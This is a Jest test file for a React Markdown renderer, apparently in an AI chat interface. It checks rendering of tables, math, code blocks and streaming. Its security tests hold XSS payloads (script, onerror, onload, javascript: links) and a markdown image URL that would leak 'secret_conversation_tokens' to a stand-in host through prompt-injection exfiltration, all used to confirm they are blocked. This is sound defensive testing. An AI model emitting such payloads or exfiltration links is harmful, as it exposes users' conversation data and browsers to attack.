import React from "react";
import { render, screen, fireEvent, waitFor, act } from "@testing-library/react";
import { Markdown } from "@/components/markdown";

// Mock next-intl translations
jest.mock("next-intl", () => ({
  useTranslations: () => (key: string) => {
    const map: Record<string, string> = {
      copyCode: "Copy code",
      codeCopied: "Copied!",
      toggleWrap: "Toggle wrap",
      blockedImage: "Blocked external image",
      visitLink: "Visit link",
    };
    return map[key] || key;
  },
}));

describe("Markdown Security & Rendering", () => {
  const originalClipboard = navigator.clipboard;

  beforeAll(() => {
    Object.assign(navigator, {
      clipboard: {
        writeText: jest.fn().mockResolvedValue(undefined),
      },
    });
  });

  afterAll(() => {
    Object.assign(navigator, {
      clipboard: originalClipboard,
    });
  });

  describe("Security: XSS and Injection Neutralization", () => {
    it("renders <script> tags as inert plain text and never executes", () => {
      const { container } = render(
        <Markdown content="Hello <script>alert('xss')</script> world" />
      );

      // Verify no script tag exists in DOM
      expect(container.querySelectorAll("script").length).toBe(0);
      expect(screen.getByText(/alert\('xss'\)/)).toBeInTheDocument();
    });

    it("renders <img onerror=...> as inert text without executing handlers", () => {
      const { container } = render(
        <Markdown content="Check <img src=x onerror=alert('xss')> this" />
      );

      // The raw HTML img tag is parsed as text, not an element
      const imgs = container.querySelectorAll("img");
      expect(imgs.length).toBe(0);
      expect(screen.getByText(/onerror=alert\('xss'\)/)).toBeInTheDocument();
    });

    it("renders <iframe> and <svg onload=...> as inert text", () => {
      const { container } = render(
        <Markdown
          content={`<iframe src="https://malicious.example.com"></iframe>\n\n<svg onload="alert(1)"></svg>`}
        />
      );

      expect(container.querySelectorAll("iframe").length).toBe(0);
      expect(container.querySelectorAll("svg").length).toBe(0);
      expect(screen.getByText(/malicious\.example\.com/)).toBeInTheDocument();
      expect(screen.getByText(/onload="alert\(1\)"/)).toBeInTheDocument();
    });

    it("sanitizes javascript: links to prevent script execution on click", () => {
      const { container } = render(
        <Markdown content="[Malicious Link](javascript:alert('pwned'))" />
      );

      const link = container.querySelector("a");
      // react-markdown urlTransform filters out javascript: by returning empty or invalid url
      if (link) {
        expect(link.getAttribute("href")).not.toContain("javascript:");
      }
    });
  });

  describe("Security: Prompt-Injection Image Exfiltration Blocking", () => {
    it("blocks arbitrary remote image exfiltration and renders a safe fallback link", () => {
      const evilUrl = "https://evil.test/leak?data=secret_conversation_tokens";
      const { container } = render(
        <Markdown content={`![Exfiltrated Data](${evilUrl})`} />
      );

      // Must NOT contain an <img> element with the malicious source
      const img = container.querySelector(`img[src="${evilUrl}"]`);
      expect(img).toBeNull();

      // Must render a safe fallback link showing alt text with warning/neutral indication
      const fallbackLink = screen.getByRole("link", { name: /Exfiltrated Data/i });
      expect(fallbackLink).toBeInTheDocument();
      expect(fallbackLink).toHaveAttribute("target", "_blank");
      expect(fallbackLink).toHaveAttribute("rel", expect.stringContaining("noopener"));
    });

    it("allows trusted Cloudinary images", () => {
      const cloudinaryUrl =
        "https://res.cloudinary.com/demo/image/upload/sample.jpg";
      const { container } = render(
        <Markdown content={`![Sample Cloudinary](${cloudinaryUrl})`} />
      );

      const img = container.querySelector(`img[src="${cloudinaryUrl}"]`);
      expect(img).not.toBeNull();
      expect(img).toHaveAttribute("alt", "Sample Cloudinary");
    });

    it("allows local blob URLs (for local uploads/previews)", () => {
      const blobUrl = "blob:http://localhost:3000/123e4567-e89b-12d3-a456-426614174000";
      const { container } = render(
        <Markdown content={`![Blob Preview](${blobUrl})`} />
      );

      const img = container.querySelector(`img[src="${blobUrl}"]`);
      expect(img).not.toBeNull();
    });

    it("allows inline base64 data URLs", () => {
      const dataUrl =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";
      const { container } = render(
        <Markdown content={`![Data Icon](${dataUrl})`} />
      );

      const img = container.querySelector(`img[src="${dataUrl}"]`);
      expect(img).not.toBeNull();
    });
  });

  describe("Link & External Navigation Safety", () => {
    it("decorates links with target='_blank' and rel='noopener noreferrer nofollow'", () => {
      render(<Markdown content="Visit [Google Docs](https://docs.google.com/document)" />);

      const link = screen.getByRole("link", { name: /Google Docs/i });
      expect(link).toBeInTheDocument();
      expect(link).toHaveAttribute("target", "_blank");
      expect(link).toHaveAttribute("rel", "noopener noreferrer nofollow");
      expect(link).toHaveAttribute("title", expect.stringContaining("docs.google.com"));
    });
  });

  describe("Math (KaTeX) Rendering", () => {
    it("renders inline math using remark-math and rehype-katex", () => {
      const { container } = render(<Markdown content="Energy formula: $E = mc^2$" />);

      const katexElem = container.querySelector(".katex");
      expect(katexElem).not.toBeNull();
    });

    it("renders block math display equation", () => {
      const { container } = render(
        <Markdown content={"$$\n\\frac{a}{b} = c\n$$"} />
      );

      const katexDisplay = container.querySelector(".katex-display");
      expect(katexDisplay).not.toBeNull();
    });
  });

  describe("Table Layout & Sticky Headers", () => {
    it("renders GitHub Flavored Markdown tables with horizontal scroll and styling", () => {
      const tableMd = `
| Feature | Supported | Notes |
| :--- | :---: | ---: |
| Tables | Yes | Overflow scroll |
| Math | Yes | KaTeX |
`;
      const { container } = render(<Markdown content={tableMd} />);

      const table = container.querySelector("table");
      expect(table).not.toBeNull();
      expect(screen.getByText("Overflow scroll")).toBeInTheDocument();
      expect(screen.getByText("KaTeX")).toBeInTheDocument();

      // Check header sticky class
      const th = container.querySelector("th");
      expect(th).toHaveClass("sticky");
    });
  });

  describe("Code Block Features", () => {
    it("renders code blocks with language badge and copy button", async () => {
      const codeSnippet = "```python\ndef hello():\n    return 'world'\n```";
      render(<Markdown content={codeSnippet} />);

      expect(screen.getByText("python")).toBeInTheDocument();
      const copyBtn = screen.getByTitle("Copy code");
      expect(copyBtn).toBeInTheDocument();

      await act(async () => {
        fireEvent.click(copyBtn);
      });
      expect(navigator.clipboard.writeText).toHaveBeenCalledWith(
        "def hello():\n    return 'world'"
      );
      expect(screen.getByText("Copied")).toBeInTheDocument();
    });

    it("toggles wrap mode on wrap button click", () => {
      const codeSnippet = "```typescript\nconst longLine = 'a'.repeat(200);\n```";
      const { container } = render(<Markdown content={codeSnippet} />);

      const wrapBtn = screen.getByTitle("Enable line wrap");
      expect(wrapBtn).toBeInTheDocument();

      const pre = container.querySelector("pre");
      expect(pre).toHaveClass("overflow-x-auto");

      // Click wrap
      fireEvent.click(wrapBtn);
      expect(pre).toHaveClass("whitespace-pre-wrap");
    });

    it("renders inline code with badge styling", () => {
      const { container } = render(<Markdown content="Use the `const foo = 'bar'` variable." />);

      const inlineCode = container.querySelector("code:not(pre code)");
      expect(inlineCode).not.toBeNull();
      expect(inlineCode?.textContent).toBe("const foo = 'bar'");
    });
  });

  describe("Streaming Performance & Memoization", () => {
    it("splits content into separate memoized blocks by double newlines", () => {
      const content = "First paragraph block.\n\nSecond paragraph block.\n\nThird paragraph block.";
      const { rerender } = render(<Markdown content={content} isStreaming={true} />);

      expect(screen.getByText("First paragraph block.")).toBeInTheDocument();
      expect(screen.getByText("Second paragraph block.")).toBeInTheDocument();
      expect(screen.getByText("Third paragraph block.")).toBeInTheDocument();

      // Simulate streaming append to tail
      const streamedContent = content + " Now with more tail content!";
      rerender(<Markdown content={streamedContent} isStreaming={true} />);

      expect(screen.getByText(/Now with more tail content!/)).toBeInTheDocument();
      expect(screen.getByText("First paragraph block.")).toBeInTheDocument();
    });
  });
});
